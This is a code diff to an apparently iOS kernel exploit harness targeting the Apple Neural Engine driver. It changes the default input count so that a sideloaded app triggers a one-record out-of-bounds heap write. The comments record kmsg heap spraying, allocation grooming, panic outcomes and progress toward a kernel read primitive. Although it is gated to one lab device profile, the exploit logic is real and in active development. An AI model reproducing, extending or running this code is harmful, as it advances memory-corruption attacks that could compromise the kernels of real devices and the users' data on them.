@@ -158,7 +158,7 @@
 #import <math.h>
 #import <objc/message.h>
 
-#define P044_BUILD @"p044-v73-820spray-gm"
+#define P044_BUILD @"p044-v73-820spray-gm192"
 
 #define INPUT_COUNT 191
 /* v73: P034 class. kdata = msgh_size + 0x24. ANE table view is 0x820.
@@ -979,11 +979,13 @@ static void p044_stage_surfaces(uint32_t *sidsOut, uint32_t maxOut,
    No raw IOConnect send: the program handle binds to the loading connection
    (run#1: fresh conn -> sel0 kr=0x5, sel2 0xe00002c2). */
 
-#define P044_REQ_IN 191u
-/* v58/v70 REQ_IN is INPUT count. Table records = N + 1 output.
+#define P044_REQ_IN 192u
+/* v58/v70/v73 REQ_IN is INPUT count. Table records = N + 1 output.
    N=191 → 192 records = in-bounds (B1). N=192 → 193 records = 1-record OOB
-   at neighbor+0 (note 149 candidate 2 / note 175). Documents/p044_req_in.txt
-   overrides N for one tap (consumed). Do not treat N as the table count. */
+   at neighbor+0 (note 149 candidate 2 / note 175). Default is 192 so a
+   sideload without HouseArrest still fires 1-record OOB. Documents/p044_req_in.txt
+   overrides N for one tap (consumed). Write 191 for in-bounds. Do not treat N
+   as the table count. Do not remaining-fire 254. */
 static uint32_t p044ReqInOverride;
 static uint32_t p044_req_in(void) { return p044ReqInOverride ? p044ReqInOverride : P044_REQ_IN; }
 /* v56: 602112 -> 0x4000. Note 127 proved CheckandPrewire marshals into a FIXED
@@ -2245,7 +2247,7 @@ static void *watch_worker(void *arg) {
     [out appendString:@"Oct-2 panic pack: record area = dedicated kalloc.3072 (192x16); GZAlloc guard abort (pc=+0x18C store) and modified-after-free are the two freed-lane failure modes. Hole lane CLOSED.\n"];
     [out appendString:@"Run#1 proof: raw IOConnect conn CLOSED (handle binds to sharedConnection; sel0 kr=0x5, sel2 0xe00002c2).\n"];
     [out appendString:@"Landing lane: HOLE_MODE=0 live 0x820 kmsg (v73). Hole punch CLOSED. Guest Direct-B overlap CLOSED (v72 err=0).\n"];
-    [out appendString:@"v73 0x820 spray: inline+port-kind msgh_size=0x7FC → kdata=0x820 (P034 class / pack 40). Was PAYLOAD 0xb80 → kdata 0xbbc. REQ_IN=192 (p044_req_in.txt) is 1-record OOB: spilled record is OUTPUT {outSid,0,1,2} at neighbor+0 (out_entry occupancy; 0xcN fingerprint needs N>=193). Do not remaining-fire 254. kalloc_type may still sequester kmsg vs ANE IOMallocType. Occupancy HIT is a 3072 store. NOT conversion. NOT hasKread. AfterKread HOLD.\n"];
+    [out appendString:@"v73 0x820 spray: inline+port-kind msgh_size=0x7FC → kdata=0x820 (P034 class / pack 40). Was PAYLOAD 0xb80 → kdata 0xbbc. Default REQ_IN=192 is 1-record OOB (no HouseArrest): spilled record is OUTPUT {outSid,0,1,2} at neighbor+0 (out_entry occupancy; 0xcN fingerprint needs N>=193). Write Documents/p044_req_in.txt=191 for in-bounds. Do not remaining-fire 254. kalloc_type may still sequester kmsg vs ANE IOMallocType. Occupancy HIT is a 3072 store. NOT conversion. NOT hasKread. AfterKread HOLD.\n"];
     [out appendString:@"record_forge: forge_seen>0 = spilled body carries client-chosen sids (bar half one).\n\n"];
 
     pthread_mutex_lock(&g_evLock);
@@ -2279,9 +2281,13 @@ static void *watch_worker(void *arg) {
                 p044ReqInOverride = n;
                 [out appendFormat:@"  [v58] REQ_IN OVERRIDE=%u (from app Documents/p044_req_in.txt; file consumed)\n", n];
             } else {
-                [out appendFormat:@"  [v58] p044_req_in.txt present but N=%u out of range 2..4096 — default 191 kept\n", n];
+                [out appendFormat:@"  [v58] p044_req_in.txt present but N=%u out of range 2..4096 — default %u kept\n",
+                 n, P044_REQ_IN];
             }
             unlink(sweepPath.fileSystemRepresentation);
+        } else {
+            [out appendFormat:@"  [v73] REQ_IN default=%u (1-record OOB). Documents/p044_req_in.txt ABSENT — HouseArrest not required. Write 191 for in-bounds.\n",
+             P044_REQ_IN];
         }
     }
 
@@ -2664,6 +2670,8 @@ static void *watch_worker(void *arg) {
     NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p044"];
     if (stop) { [out appendString:stop]; p044_write_log(out); return out; }
     [out appendString:[LabDeviceProfile identBlock]];
+    [out appendString:[LabDeviceProfile huntTapWarn:@"p044"]];
+    [LabDeviceProfile stampLastTap:@"p044"];
     {
         const LabOffTab *off = LabOff();
         uint32_t recs = p044_req_in() + 1u;
